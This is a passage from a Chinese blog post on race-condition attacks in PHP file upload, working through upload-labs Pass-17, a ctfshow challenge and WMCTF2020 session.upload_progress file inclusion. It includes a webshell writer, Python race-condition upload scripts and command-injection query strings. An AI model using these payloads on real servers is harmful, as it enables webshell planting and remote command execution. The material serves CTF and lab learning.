class="hljs-string">&quot;can&#x27;t upload php file!&quot;</span>);<br>&#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;upload error&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>继续上传一个php文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><span class="hljs-variable">$content</span>=<span class="hljs-string">&#x27;&lt;?php system($_GET[&quot;c&quot;]);?&gt;&#x27;</span>;<br>file_put_contents(<span class="hljs-string">&#x27;test.php&#x27;</span>,<span class="hljs-variable">$content</span>);<br>?&gt;<br></code></pre></td></tr></table></figure><p>在执行完move_uploaded_file之后，执行unlink之前，此时这个php文件是已经保存到了web服务器上的，并且我们能够访问。</p><p>如果上传的php的功能是写一句话到一个php文件，这样我们在删除之前访问该文件，就会生成一个一句话木马，就可以得到webshell。 所以我们使用多线程并发的不断访问上传的文件，务器中的函数执行都是需要时间的，如果我上传上去的文件在没被删除的时候，一旦成功访问到了上传的文件，那么它就会向服务器写入shell。</p><p>   一般而言，我们是上传了文件，但是最后却因为过滤或者因为其他原因被删除了，那么我们可以使用条件竞争，我们实际上是和unlink，以及删除文件的函数进行竞争。文件被访问了依旧可以删除，它删除跟我访问没有任何关系。</p><h2 id="0x03-CTF中的条件竞争"><a href="#0x03-CTF中的条件竞争" class="headerlink" title="0x03-CTF中的条件竞争"></a>0x03-CTF中的条件竞争</h2><h3 id="upload-libs-pass17"><a href="#upload-libs-pass17" class="headerlink" title="upload-libs pass17"></a>upload-libs pass17</h3><p>源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$file_name</span>,<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$file_name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$upload_file</span> = <span class="hljs-variable">$UPLOAD_ADDR</span> . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$file_name</span>;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$upload_file</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>             <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$UPLOAD_ADDR</span> . <span class="hljs-string">&#x27;/&#x27;</span>. <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br>             <span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-variable">$upload_file</span>, <span class="hljs-variable">$img_path</span>);<br>             <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>            <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$upload_file</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传失败！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<span class="hljs-comment">//存储在服务器的文件的临时副本的名称</span><br></code></pre></td></tr></table></figure><p>当我们上传web shell文件时，不会先限制php类型文件上传，先利用上面的语句把上传的文件临时存放。再执行下面的if语句进行文件类型的限制和文件名的时间戳。然后执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$upload_file</span>))<span class="hljs-comment">//移动到新文件夹</span><br></code></pre></td></tr></table></figure><p>绕过思路是利用代码执行过程有耗费时间的过程，上传速度大于匹配unlink条件就能显示webshell界面</p><p><strong>方法一</strong>：使用brup抓包</p><p>使用burpsuite抓包上传shell.php，一直重放上传文件</p><p>shell.php内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;pass.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>只要访问了shell.php文件，php文件就会成功解析执行，自动创建一个pass.php，写入一句话木马：<code>&lt;?php phpinfo();?&gt;</code><br><img src="https://img-blog.csdnimg.cn/20210414203927555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后Send to lntruder，并且进行以下的设置<br><img src="https://img-blog.csdnimg.cn/20210426193037110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Payload设置<br><img src="https://img-blog.csdnimg.cn/20210426193244134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>然后不停访问<code>http://localhost/upload-labs/upload/shell.php</code>，爆破结束后，访问pass.php，出现phpinfo信息，shell上传成功<img src="https://img-blog.csdnimg.cn/20210426193746282.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>方法二</strong>：pytho多线程上传</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding:utf-8</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">td</span>(<span class="hljs-params"><span class="hljs-built_in">list</span></span>):<br>    url = <span class="hljs-string">&#x27;http://localhost/upload-labs/Pass-17/index.php&#x27;</span><br>    files = &#123;<span class="hljs-string">&#x27;upload_file&#x27;</span>: (<br>        <span class="hljs-string">&#x27;shell2.php&#x27;</span>, <span class="hljs-string">&quot;&lt;?php fputs(fopen(&#x27;pass2.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php phpinfo();?&gt;&#x27;);?&gt;&quot;</span>)&#125;<br>    data = &#123;<span class="hljs-string">&#x27;submit&#x27;</span>: <span class="hljs-string">&#x27;上传&#x27;</span>&#125;<br>    r = requests.post(url=url, data=data, files=files)<br>    re = requests.get(<span class="hljs-string">&#x27;http://localhost/upload-labs/upload/shell2.php&#x27;</span>)<br>    <span class="hljs-keyword">if</span> re.status_code == <span class="hljs-number">200</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;上传成功&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">with</span> ThreadPoolExecutor(<span class="hljs-number">20</span>) <span class="hljs-keyword">as</span> p:<br>        p.<span class="hljs-built_in">map</span>(td, <span class="hljs-built_in">range</span>(<span class="hljs-number">200</span>))<br></code></pre></td></tr></table></figure><p>访问pass2.php，也能看到phpinfo页面<br><img src="https://img-blog.csdnimg.cn/2021042619421151.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="ctfhsow-大牛杯-web-checkin"><a href="#ctfhsow-大牛杯-web-checkin" class="headerlink" title="ctfhsow [大牛杯]-web_checkin"></a>ctfhsow [大牛杯]-web_checkin</h3><p>看<a href="https://blog.csdn.net/miuzzx/article/details/116352564">羽师傅</a>的大牛杯wp，发现用到了条件竞争漏洞，照着wp复现一下。</p><p>随便传参一个code=1,F12查看源码，注释提示仅允许index.php存在，删除所有其他文件，从这句话里可以猜测含有条件竞争漏洞。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!-- 仅允许index.php存在，删除所有其他文件 --&gt;<br>xi nei~<br></code></pre></td></tr></table></figure><p>查看所有文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?code=?&gt;&lt;?=`<span class="hljs-built_in">nl</span>%09*`<br></code></pre></td></tr></table></figure><p>读取到部分源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?=</span>`nl*`<br> <span class="hljs-number">2</span><span class="hljs-meta">?&gt;</span><br> <span class="hljs-number">3</span><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-number">4</span>    <span class="hljs-title function_ invoke__">opendir</span>(<span class="hljs-string">&quot;./&quot;</span>);<br> <span class="hljs-number">5</span>    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">readdir</span>()) &#123;<br> <span class="hljs-number">6</span>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$filename</span> != <span class="hljs-string">&quot;.&quot;</span> &amp;&amp; <span class="hljs-variable">$filename</span> != <span class="hljs-string">&quot;..&quot;</span> &amp;&amp; <span class="hljs-variable">$filename</span> != <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br> <span class="hljs-number">7</span>            <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>);<br> <span class="hljs-number">8</span>        &#125;<br> <span class="hljs-number">9</span>    &#125;<br><span class="hljs-number">10</span>    <span class="hljs-title function_ invoke__">closedir</span>();<br><span class="hljs-number">11</span><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>生成文件atkx</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?code=`<span class="hljs-built_in">nl</span>%09/*&gt;atkx`<br></code></pre></td></tr></table></figure><p>直接使用羽师傅的脚本进行条件竞争，将源码写入atkx中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><span class="hljs-comment">#author: yu2xx</span><br>import requests<br>import threading<br>import sys<br>session=requests.<span class="hljs-title function_ invoke__">session</span>()<br>url1=<span class="hljs-string">&quot;http://bdd02bb0-9c48-4203-806f-64219749382b.challenge.ctf.show:8080/sandbox/3fa05e3dafa3d6413be416b360149b5c/&quot;</span><br>url2=<span class="hljs-string">&#x27;http://bdd02bb0-9c48-4203-806f-64219749382b.challenge.ctf.show:8080/sandbox/3fa05e3dafa3d6413be416b360149b5c/atkx&#x27;</span><br>def <span class="hljs-title function_ invoke__">write</span>():<br><span class="hljs-keyword">while</span> True:<br>r = session.<span class="hljs-title function_ invoke__">get</span>(url1)<br>def <span class="hljs-title function_ invoke__">read</span>():<br><span class="hljs-keyword">while</span> True:<br>r = session.<span class="hljs-title function_ invoke__">get</span>(url2)<br><span class="hljs-keyword">if</span> <span class="hljs-title function_ invoke__">len</span>(r.text)!=<span class="hljs-number">9561</span>: <span class="hljs-comment">#随便get传一次就能得到这个长度</span><br>    <span class="hljs-keyword">print</span>(r.text)<br><br>threads = [threading.<span class="hljs-title function_ invoke__">Thread</span>(target=write),<br>       threading.<span class="hljs-title function_ invoke__">Thread</span>(target=read)]<br><span class="hljs-keyword">for</span> t in threads:<br>t.<span class="hljs-title function_ invoke__">start</span>()<br></code></pre></td></tr></table></figure><p>然后访问atkx可以读取到源码<br><img src="https://img-blog.csdnimg.cn/20210510193858557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>想要得到flag的话，直接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?code=?&gt;&lt;?=`<span class="hljs-built_in">nl</span>%09/*<br></code></pre></td></tr></table></figure><h3 id="WMCTF2020-Make-PHP-Great-Again"><a href="#WMCTF2020-Make-PHP-Great-Again" class="headerlink" title="[WMCTF2020]Make PHP Great Again"></a>[WMCTF2020]Make PHP Great Again</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">require_once</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>考查</strong>：利用<code>PHP_SESSION_UPLOAD_PROGRESS</code>进行文件包含</p><ul><li>前提: 需要知道session文件的存放位置。</li><li>思路: 利用session.upload_progress将恶意语句写入session文件，从而包含session文件。</li></ul><p>session.upload_progress 是PHP5.4的新特征。<br><img src="https://img-blog.csdnimg.cn/2021052021583531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>php.ini</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>.session.use_strict_mode=off这个选项默认值为off，表示我们对Cookie中sessionid可控。这一点至关重要，下面会用到。<span class="hljs-number">1</span>. session.upload_progress.enabled = on<br>enabled=on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；<br><br><span class="hljs-number">2</span>. session.upload_progress.cleanup = on<br>cleanup=on表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；<br><br><span class="hljs-number">3</span>. session.upload_progress.prefix = <span class="hljs-string">&quot;upload_progress_&quot;</span><br>prefix+name将表示为session中的键名<br><br><span class="hljs-number">4</span>. session.upload_progress.name = <span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br>name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；<br><br><span class="hljs-number">5</span>.session.use_strict_mode=off<br>这个选项默认值为off，表示对Cookie中sessionid可控。<br></code></pre></td></tr></table></figure><p>一个上传进度数组的结构的例子</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html">#PHPSESSION = Sn0w<br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;upload.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;&lt;?php echo ini_get(&quot;</span><span class="hljs-attr">session.upload_progress.name</span>&quot;); ?&gt;</span>&quot; value=&quot;123&quot; /&gt;<br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file1&quot;</span> /&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file2&quot;</span> /&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在session中存放的数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;upload_progress_123&quot;</span>] = <span class="hljs-keyword">array</span>(    <span class="hljs-comment">// 其中存在上面表单里的value值&quot;123&quot;</span><br> <span class="hljs-string">&quot;start_time&quot;</span> =&gt; <span class="hljs-number">1234567890</span>,   <span class="hljs-comment">// The request time 请求时间</span><br> <span class="hljs-string">&quot;content_length&quot;</span> =&gt; <span class="hljs-number">57343257</span>, <span class="hljs-comment">// POST content length  post数据长度</span><br> <span class="hljs-string">&quot;bytes_processed&quot;</span> =&gt; <span class="hljs-number">453489</span>,  <span class="hljs-comment">// Amount of bytes received and processed  已接收的字节数量</span><br> <span class="hljs-string">&quot;done&quot;</span> =&gt; <span class="hljs-literal">false</span>,              <span class="hljs-comment">// true when the POST handler has finished, successfully or not</span><br> <span class="hljs-string">&quot;files&quot;</span> =&gt; <span class="hljs-keyword">array</span>(<br>  <span class="hljs-number">0</span> =&gt; <span class="hljs-keyword">array</span>(<br>   <span class="hljs-string">&quot;field_name&quot;</span> =&gt; <span class="hljs-string">&quot;file1&quot;</span>,       <span class="hljs-comment">// Name of the &lt;input/&gt; field  上传区域</span><br>   <span class="hljs-comment">// The following 3 elements equals those in $_FILES</span><br>   <span class="hljs-string">&quot;name&quot;</span> =&gt; <span class="hljs-string">&quot;foo.avi&quot;</span>,     <span class="hljs-comment">// 上传文件名</span><br>   <span class="hljs-string">&quot;tmp_name&quot;</span> =&gt; <span class="hljs-string">&quot;/tmp/phpxxxxxx&quot;</span>,     <span class="hljs-comment">// 上传后在服务端的临时文件名</span><br>   <span class="hljs-string">&quot;error&quot;</span> =&gt; <span class="hljs-number">0</span>,<br>   <span class="hljs-string">&quot;done&quot;</span> =&gt; <span class="hljs-literal">true</span>,                <span class="hljs-comment">// True when the POST handler has finished handling this file</span><br>   <span class="hljs-string">&quot;start_time&quot;</span> =&gt; <span class="hljs-number">1234567890</span>,    <span class="hljs-comment">// When this file has started to be processed</span><br>   <span class="hljs-string">&quot;bytes_processed&quot;</span> =&gt; <span class="hljs-number">57343250</span>, <span class="hljs-comment">// Amount of bytes received and processed for this file</span><br>  ),<br>  <span class="hljs-comment">// An other file, not finished uploading, in the same request</span><br>  <span class="hljs-number">1</span> =&gt; <span class="hljs-keyword">array</span>(<br>   <span class="hljs-string">&quot;field_name&quot;</span> =&gt; <span class="hljs-string">&quot;file2&quot;</span>,<br>   <span class="hljs-string">&quot;name&quot;</span> =&gt; <span class="hljs-string">&quot;bar.avi&quot;</span>,<br>   <span class="hljs-string">&quot;tmp_name&quot;</span> =&gt; <span class="hljs-literal">NULL</span>,<br>   <span class="hljs-string">&quot;error&quot;</span> =&gt; <span class="hljs-number">0</span>,<br>   <span class="hljs-string">&quot;done&quot;</span> =&gt; <span class="hljs-literal">false</span>,<br>   <span class="hljs-string">&quot;start_time&quot;</span> =&gt; <span class="hljs-number">1234567899</span>,<br>   <span class="hljs-string">&quot;bytes_processed&quot;</span> =&gt; <span class="hljs-number">54554</span>,<br>  ),<br> )<br>);<br></code></pre></td></tr></table></figure><p>在<code>session.upload_progress.name=&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;</code>的条件下,上传文件，便会在<code>session[&#39;upload_progress_123&#39;]</code>中储存一些本次上传相关的信息,储存在<code>/tmp/sess_Sn0w</code>中</p><p>Session的默认保存路径<br>在php.ini里的配置session.save_path是注释掉的，那么Seesion保存的路径在不同类型操作系统保存在什么位置？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">Linux：<br>/tmp/sess_PHPSESSID<br>/var/lib/php/sess_PHPSESSID<br>/var/lib/php5/sess_PHPSESSID<br>/var/lib/php7/sess_PHPSESSID<br>/var/lib/php/sessions/sess_PHPSESSID<br>/tmp/sessions/sess_PHPSESSID<br><br>Windows：<br>C:\WINDOWS\Temp<br></code></pre></td></tr></table></figure><p>在本地phpstudy中找到session的存储位置<br><img src="https://img-blog.csdnimg.cn/20210520220749657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>理论具体参考：<a href="https://www.yuque.com/u5013914/sn0w/blh341#LbWIR">https://www.yuque.com/u5013914/sn0w/blh341#LbWIR</a></p><p>解题方法1：burpsite条件竞争</p><p>本地html向指定网址上传文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://f0ea2244-d2b8-43be-8ec6-f61da1585183.chall.ctf.show:8080/&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;123&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>bp设置，Cookie里设置<code>PHPSESSID=flag</code>，PHP将会在服务器上创建一个文件：<code>/tmp/sess_flag</code>，利用session.upload_progress写入恶意语句<br><img src="https://img-blog.csdnimg.cn/2021052013092414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>GET方式访问?file=/tmp/sess_flag<br><img src="https://img-blog.csdnimg.cn/20210520130945799.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" 